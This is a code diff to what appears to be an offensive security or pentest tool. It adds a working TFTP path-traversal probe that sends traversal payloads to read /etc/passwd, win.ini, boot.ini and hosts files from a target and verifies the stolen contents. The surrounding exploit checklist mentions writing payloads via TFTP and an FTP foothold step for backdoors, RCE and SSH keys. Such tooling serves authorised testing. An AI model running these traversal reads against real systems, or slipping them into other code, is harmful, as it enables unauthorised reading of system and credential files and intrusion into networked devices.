@@ -2279,6 +2279,17 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
         return {"state": "EXPOSED", "cve": cve, "risk": "HIGH" if ni else "MEDIUM",
                 "summary": summ[:140]}
 
+    # 2ba) tftp-probe: path-traversal arbitrary read (critical) → else just a reachable TFTP server
+    if sid == "tftp-probe":
+        reads = re.findall(r"^✗ VULN arbitrary file read via path traversal — (.+?) readable$", output, re.M)
+        if reads:
+            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                    "summary": f"TFTP path-traversal read: {', '.join(reads[:4])}"[:140]}
+        if "it's a TFTP server" in output:
+            return {"state": "INFO", "cve": None, "risk": "LOW",
+                    "summary": "TFTP/69 reachable — no auth, read/write primitive"[:140]}
+        return None
+
     # 2at) ftp-banner: known-backdoor FTP version → critical RCE; else version info
     if sid == "ftp-banner":
         vulns = re.findall(r"^✗ VULN (.+)$", output, re.M)
@@ -3117,7 +3128,7 @@ _EXPLOIT_STEPS = {
         ("Manual steps & further research", "ftp-next"),
     ],
     "tftp": [
-        "Confirm UDP/69 (no auth)",
+        ("Confirm UDP/69 (no auth) + path-traversal read", "tftp-probe"),
         "GET well-known files: running-config / startup-config, backups, app configs",
         "Test PUT (arbitrary write) → overwrite a config or drop a payload",
         "Fuzz filenames from a wordlist — device configs often leak credentials",
@@ -11284,6 +11295,111 @@ def _tool_ftp_next(ip: str, port: int, proto: str) -> str:
     return "\n".join(L)
 
 
+# ══ TFTP (UDP/69) ══ different beast from FTP: no auth, no listing, no banner, no DELETE.
+# Only two primitives — RRQ (read) and WRQ (write) — over connectionless UDP. Pure stdlib
+# (there is no tftplib); the protocol is a handful of opcodes on a datagram socket.
+_TFTP_RRQ, _TFTP_WRQ, _TFTP_DATA, _TFTP_ACK, _TFTP_ERROR = 1, 2, 3, 4, 5
+
+
+def _tftp_read(ip: str, port: int, filename: str, timeout: float = 4.0,
+               max_bytes: int = 65536) -> tuple:
+    """Read a file over TFTP (octet mode) on a raw UDP socket. Returns (status, payload):
+    ('data', bytes) on success, ('error', 'code:msg') on a TFTP ERROR, ('timeout', '') on silence.
+    Handles the server's ephemeral TID, multi-block DATA and ACKs. Read-only."""
+    import socket
+    import struct
+    pkt = struct.pack("!H", _TFTP_RRQ) + filename.encode("latin-1", "replace") + b"\x00octet\x00"
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.settimeout(timeout)
+    data = bytearray()
+    try:
+        s.sendto(pkt, (ip, port))
+        tid, expected = None, 1
+        while True:
+            try:
+                resp, addr = s.recvfrom(1024)
+            except socket.timeout:
+                return ("data", bytes(data)) if data else ("timeout", "")
+            if tid is None:
+                tid = addr                                   # lock onto the server's TID
+            elif addr != tid:
+                continue                                     # ignore strays from other ports
+            if len(resp) < 4:
+                continue
+            op = struct.unpack("!H", resp[:2])[0]
+            if op == _TFTP_ERROR:
+                code = struct.unpack("!H", resp[2:4])[0]
+                msg = resp[4:].split(b"\x00", 1)[0].decode("latin-1", "replace")
+                return ("error", f"{code}:{msg}")
+            if op == _TFTP_DATA:
+                block = struct.unpack("!H", resp[2:4])[0]
+                chunk = resp[4:]
+                s.sendto(struct.pack("!HH", _TFTP_ACK, block), addr)
+                if block == expected:
+                    data += chunk
+                    expected = (expected + 1) & 0xffff
+                    if len(chunk) < 512 or len(data) >= max_bytes:
+                        return ("data", bytes(data))
+    finally:
+        s.close()
+
+
+# ── TFTP step 1: confirm UDP/69 (no auth) + path-traversal arbitrary read ───────
+# Traversal payloads for the classic TFTP daemon read bugs (SolarWinds, tftpd32, HP, …).
+# We only ASSERT a vuln when the retrieved bytes actually match the target file's signature —
+# no CVE token is emitted (the exact CVE is daemon-specific; see tftp-next / searchsploit).
+_TFTP_TRAVERSAL = [
+    ("etc/passwd",          re.compile(rb"^\w+:.*:0:0:", re.M),                    "unix", "/etc/passwd"),
+    ("windows/win.ini",     re.compile(rb"(?i)\[fonts\]|\[extensions\]"),          "win",  "win.ini"),
+    ("boot.ini",            re.compile(rb"(?i)\[boot loader\]"),                   "win",  "boot.ini"),
+    ("windows/system32/drivers/etc/hosts", re.compile(rb"(?i)localhost"),         "win",  "hosts"),
+]
+_TFTP_TRAVERSAL_DEPTHS = (5, 7, 9, 12)
+
+
+def _tool_tftp_probe(ip: str, port: int, proto: str) -> str:
+    """TFTP step 1 tool: confirm the service is live (RRQ a random name → a TFTP ERROR reply proves
+    a server, since TFTP has no banner/login), then test directory-traversal reads against the
+    classic daemon bugs (SolarWinds / tftpd32 / HP) — content-verified against each file's
+    signature. Raw-UDP stdlib, read-only. A silent host raises. Authorised targets only."""
+    import os
+    lines = []
+    probe_name = f"~pshunter_{os.urandom(4).hex()}.probe"
+    st, payload = _tftp_read(ip, port, probe_name, timeout=4.0)
+    if st == "error":
+        code, _, msg = payload.partition(":")
+        lines.append(f"[*] TFTP {ip}:{port} answered (ERROR {code} '{msg}') — it's a TFTP server, no auth")
+    elif st == "data":
+        lines.append(f"[*] TFTP {ip}:{port} answered with DATA — it's a TFTP server, no auth")
+    else:
+        # one retry — UDP is lossy; a truly dead/filtered service stays silent
+        st2, _ = _tftp_read(ip, port, probe_name, timeout=4.0)
+        if st2 == "timeout":
+            raise RuntimeError(f"{ip}:{port}/udp — no TFTP reply (filtered, or not a TFTP server)")
+        lines.append(f"[*] TFTP {ip}:{port} answered on retry — it's a TFTP server, no auth")
+
+    save_services(ip, [{"port": port, "proto": proto, "name": "tftp"}])
+
+    hits, tried = [], 0
+    for fname, sig, family, label in _TFTP_TRAVERSAL:
+        for depth in _TFTP_TRAVERSAL_DEPTHS:
+            sep = "\\" if family == "win" else "/"
+            path = (".." + sep) * depth + fname.replace("/", sep)
+            tried += 1
+            rst, rpl = _tftp_read(ip, port, path, timeout=3.0, max_bytes=8192)
+            if rst == "data" and rpl and sig.search(rpl):
+                excerpt = rpl.decode("latin-1", "replace").splitlines()[0][:80]
+                hits.append((label, path, excerpt))
+                break                                        # this file is readable — next target
+    if hits:
+        for label, path, excerpt in hits:
+            lines.append(f"✗ VULN arbitrary file read via path traversal — {label} readable")
+            lines.append(f"  {DIM}{path}  →  {excerpt}{RESET}")
+    else:
+        lines.append(f"· no path-traversal read ({tried} payloads tried) — daemon may be chrooted/patched")
+    return f"TFTP probe — {ip}:{port}/udp\n\n" + "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
@@ -11341,6 +11457,7 @@ _STEP_TOOLS = {
     "ftp-bounce": ("FTP-bounce (PORT) → scan internal 127.0.0.1 ports (stdlib)", _tool_ftp_bounce),
     "ftp-foothold": ("foothold → backdoor / web-RCE / ssh-key (interactive, pick)", _tool_ftp_foothold),
     "ftp-next": ("manual FTP steps (context-aware, reference only)", _tool_ftp_next),
+    "tftp-probe": ("confirm UDP/69 + path-traversal read (raw UDP, content-verified)", _tool_tftp_probe),
 }
 
 def _mins(seconds: int) -> str:
@@ -11413,6 +11530,7 @@ _STEP_TOOL_RUNS = {
     "ftp-bounce":       ("Python", f"{_mins(_FTPBOUNCE_DEADLINE)} min"),
     "ftp-foothold":     ("Python + nc/ssh", None),
     "ftp-next":         ("reference · no scan", None),
+    "tftp-probe":       ("Python (raw UDP)", None),
 }
 
 
